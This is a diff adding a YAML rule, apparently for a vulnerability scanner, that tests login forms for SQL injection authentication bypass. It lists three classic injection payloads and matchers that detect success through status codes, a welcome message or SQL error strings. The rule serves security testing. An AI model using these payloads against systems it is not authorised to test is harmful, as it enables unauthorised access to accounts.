@@ -1,0 +1,30 @@
+# rules/sqli_auth_bypass.yaml
+id: sqli-auth-bypass
+info:
+  name: SQL Injection Authentication Bypass
+  author: Aditya
+  severity: CRITICAL
+  description: Tests for basic SQLi logic flaws that allow authentication bypass.
+
+attack:
+  # The payloads to inject into the target
+  payloads:
+    - "' OR '1'='1"
+    - "admin' --"
+    - "' OR 1=1 LIMIT 1 --"
+  
+test:
+  # The rules to determine if the attack was successful
+  matchers:
+    - type: status
+      condition: or
+      values:
+        - 200
+        - 500
+    - type: regex
+      condition: or
+      values:
+        - "Welcome back"
+        - "syntax error at or near"
+        - "SQL syntax"
+        
